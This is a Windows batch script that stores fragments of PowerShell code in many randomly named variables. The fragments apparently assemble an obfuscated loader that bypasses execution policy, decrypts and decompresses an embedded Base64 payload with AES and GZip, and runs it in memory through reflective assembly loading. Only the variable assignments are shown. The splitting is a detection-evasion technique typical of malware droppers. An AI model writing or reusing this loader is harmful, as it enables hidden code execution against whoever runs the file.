@echo off
set "NnZjzTIIPD=, $P"
set "OhJuDPMfNG=ment"
set "SUZUrEqBbI=comp"
set "gGEVsXSfAq=[]] "
set "tdSgVEbIxe=Secu"
set "qYFULMcmWi=106u"
set "dqSmniJaQb=E, 0"
set "oBnLEdAmAF=yste"
set "FUljwccNXq=d;$o"
set "ybTOwwBJmf=brea"
set "JxmNMouSEx=E = "
set "iqONnSdOfJ=Ci.D"
set "ByXUgQVFKE=pStr"
set "kbcCZeHHlk=yste"
set "UpxOzHlxKX=$eCf"
set "jtkLgXTNlp= '')"
set "dMfQPNYLiP=$iwN"
set "PKbjdPWisF=($CD"
set "ENkMClZwwe=m.IO"
set "bDXDuuLWnm=pose"
set "wxoSOqHoUx=rtS4"
set "ajnOSZVClK=($CD"
set "ejZeYzyTPE=ptor"
set "wGJiAbEmKQ=urit"
set "HjZVNsundv=ress"
set "mPGatYmJPY==');"
set "FTVTgrybRf=tE);"
set "NtnrFTzpIZ=Phzt"
set "APtnUHGvAK=New-"
set "tmjiFPwmPX=ddin"
set "kJdxSvkoRq= = ["
set "wDDQJgcJWS=] -j"
set "BbCXUglfTf=sion"
set "KFEsuScVlC=raph"
set "thjVauYNOS=Comp"
set "rhxlnUbTRZ=onve"
set "ZyUSYbRMus=form"
set "oEDQIpxSis=kP.T"
set "UAhoCMqErN=oL'["
set "fvTDkNQPoa=ode]"
set "LJapleevPG=ay()"
set "TvwREgaihW=rt]:"
set "sElZAJaBVC=$vsO"
set "xKZZgvmvct=aDh."
set "BGRBlPyimn=tion"
set "BccoOpYfQq=-ep "
set "OJegUGIrHx=rity"
set "tdUsBLYICA= New"
set "XMfWwvuOYy=$Phz"
set "PkwLBkAxCV='txe"
set "RLCTOlbPyv=oin "
set "YLwuixhOUP=gsYZ"
set "DliyIhksiT=zuZI"
set "XUtRjoRXvg=trea"
set "TJaWxcrvZT=('%*'"
set "oIvIHKcUbG=wr ="
set "cWbIWZbkJV=hy.A"
set "NhnQeYrWuu=em.C"
set "arhHCPgPcK=CDIL"
set "dCpGheBcfS=ach "
set "iVYlsjuPIh=1..-"
set "lpDWbJoYOG=e]::"
set "fHfljwOoWR= '')"
set "UwFUMzUIOv=G = "
set "VzqoNbuNkf=-joi"
set "QxmXRSbuLR=.Con"
set "JDfGxdjGga=, (,"
set "hXiyakwZlF=bHCi"
set "tIcfQSNPiv=);$v"
set "nUVBGCVqMV=;$ZF"
set "LRCKdrGyhn=('da"
set "vcEfZJFKxq=wKEE"
set "bZgSEQfdUm=.Cre"
set "ATKzYPNIpQ=fore"
set "tLqhmkllvs=k; }"
set "RtpTNGtJmo=VWkT"
set "HWgbjyKGHJ=ddin"
set "piJOqKZtgl=gnir"
set "elbmViGQYp=Il.T"
set "wGSjBHzihC=daeR"
set "yjnIdzCMhS=nage"
set "lbNqeGoqIj=ptog"
set "ppAfGEDnED== [S"
set "jEFdjoLeIX=16] "
set "ficUFSTsug=.IO."
set "tWdAjKyimY=vert"
set "tJhATlqUOU=Secu"
set "uucZikjnBs=tsWi"
set "oKPGJAJFAD=::('"
set "PDurFkmYDm=$XbH"
set "rsUZiqMAgH===')"
set "ZdAKENJIUn=ILX."
set "AUwqKrnjLd=tS46"
set "nLltMHTBvA=O.Me"
set "tMRtqdAUKh=flec"
set "wQUKoEBlMo=dj0C"
set "sAnQeWheJZ=NIl "
set "PGEDSemPlx=);$o"
set "YjPygvOtJk=saBm"
set "jOWOaqTbeP=$oyM"
set "HTAyyqGWGY=eCfw"
set "JVhZlFAjzp=.Dis"
set "zOHqvAkgxe=X.Su"
set "rUwGFyWTrP=Phzt"
set "EufRlQkTIB=]::("
set "qljfLugbDw=esaB"
set "uzMvSssLLk=.Cry"
set "VaKpvoQsWf=ress"
set "nYMMRpKhfx=Disp"
set "JBnJjhinpD=ert]"
set "suxpcYwyRr=Syst"
set "EerJueJnhW=yMSV"
set "aumXhCXnnH=.Len"
set "xoCvVcIkVC=ing("
set "NoQnjkUgUZ=ress"
set "tCsiNkTOOQ= [Sy"
set "TEjDJjZnlT=pher"
set "CZaiugAFcH=iron"
set "wpcRpgIiUy=e = "
set "wEyQweBZkm=)($j"
set "cNimwxvvNF=PKCS"
set "HCCVCCaqfR='gni"
set "GUFejPurtG=em.I"
set "fgxlbuerVL=ring"
set "GZQeAAUOdd=$Phz"
set "RZkUfpjQUi=; };"
set "LsqabhBoqD=join"
set "gEiCWYdpqJ=kP ="
set "DwgBDFFvuV=  $j"
set "gLtuGIldBb=();$"
set "hOgedtoyWs='[-1"
set "pFaUonZyfx=[Env"
set "LPLmfofSqV=lit("
set "EXQKoRimuj=6] -"
set "OWCjfITsuo=Phzt"
set "kmgBsjZOXq=m.Re"
set "wXLkUNcfky=yTo("
set "xcXIuEHnkg=;$VW"
set "ettGTUWlTG= if "
set "lRSbtHnKDF=.Mem"
set "qclKDuRXeE=yMSV"
set "vzNEYkyAdY=le  "
set "wpNGtgdIrZ=.Cop"
set "IrGXWqGNRU=comm"
set "zOPmVBfebr=join"
set "hrpPgoGMEO=;$iw"
set "cSmjQvTWhl=yMSV"
set "CcXDJMCYLa=gjYA"
set "wmVGjFsZiJ=g = "
set "bbnPtMnbxj=[Sys"
set "uyBhhWZiaT=oint"
set "QoeORKZwEP=;$iw"
set "bsOYURdZwb=Mode"
set "RLBXbdFIAW=-joi"
set "EOqnkyjJlW=embl"
set "zUQFDQapJi=ss -"
set "zKuyVUnZnF=hztE"
set "vjLpvFiFGc=Invo"
set "wyzKjUXMIB=y.Ci"
set "xBxRNFfQdo=gMod"
set "sROUcWoDMl=lBlo"
set "TziNwQjpDv=.Dis"
set "dUpCGlrssL=zHhH"
set "nQoCYVUnbC=n ''"
set "DhbCNLqxfx=ose("
set "CIoSBYAypr=$vsO"
set "BpacQNGPGY=and "
set "uPSyrgcwKd=wKEE"
set "TjYfrBpcyu='[-1"
set "SMONhjPVEH=bjec"
set "flmJArazRI=yMSV"
set "GgyBdEUimG=rans"
set "lDOzGrRXDQ=)($P"
set "ArkRjqKseW=-Obj"
set "zvDYKmBnQj= = N"
set "zMlsSEcYqw=]::N"
set "aKzFMCLZin=PTtG"
set "CowxUjXvQl=('Tg"
set "XsqvIyuioD=hztE"
set "PDvMZRAGQP=raph"
set "kFvpoNiNMZ=[IO."
set "zFLuulPoGP== $o"
set "doUwYkXmbh=nirt"
set "zKGGpLODSY=ewLi"
set "tIcGjzvRsS=rofi"
set "QOqhrtTraC=SV.I"
set "MAZEPTJtFw=.Mod"
set "kkJLotUSyp=stem"
set "jDZvXddIRe=TG, "
set "DYZbpHjLyK=stem"
set "PhtdDKZIcF=L4Yi"
set "SBTVkyyyIZ=tem."
set "zsfOxqpCnJ=ecry"
set "lnrFpekcmQ=:: '"
set "ChbgiVgsMp=tem."
set "gfJpXFkqqT='0Pg"
set "MgNlTHLLGX=YxVw"
set "SQzBPGrinT=ck($"
set "niLhLMvWVn=Syst"
set "NnPqjWoRBn=grap"
set "bISXXZqjcp=bypa"
set "wQfoeKrTBy=7;$o"
set "ZdwUpDDuZc=ypto"
set "ZDGPcyqlRe=sOkP"
set "WrrmgeUngM=gth)"
set "XmIDtnsRqQ=tryP"
set "ncgtlciZMw=.Ass"
set "zDRewSbUwz=pres"
set "mATwmeYDcW=..-1"
set "bcJYrEqYOc=ct S"
set "JFDNrFyfHJ=s75K"
set "VOxQqcgeih=Stre"
set "pcEPlEaACu=)) {"
set "RMVWNMCdhk=]::C"
set "VxCNuQohlP=);$Z"
set "IiLjjRuhXG=Bmor"
set "SJXUvhQdXm=eMVs"
set "TTAumaikRR=XbHC"
set "vSGGIPjUuq=se()"
set "BXMXudqgXQ=ke($"
set "pdDerRkOGo=::De"
set "JjuPmdEevz=ose("
set "kNEqAqIwiJ=rity"
set "uNKgxTKktJ=m.IO"
set "yPAYWFBZSt=orF'"
set "GtZpUCXrve=am;$"
set "irlXLznvdJ=i = "
set "HCJjLMmFkS=-4] "
set "sbZqLeUwfw=;$bi"
set "bVTABLURMr=();$"
set "RzMeYmdbPo=..-1"
set "YgnbVljkBc=in $"
set "VuuhGGaepE=Disp"
set "qOUIthRJWx=-nop"
set "NzQJgiVFqz=ne);"
set "QXpGJgImQW=V.Pa"
set "ILjOlFWHWY=pose"
set "jdTFJyiMdR=).Sp"
set "FTBJRYtbXZ=m(, "
set "lcdNSyKHBL=RmAx"
set "HVZwHObbfP=biFd"
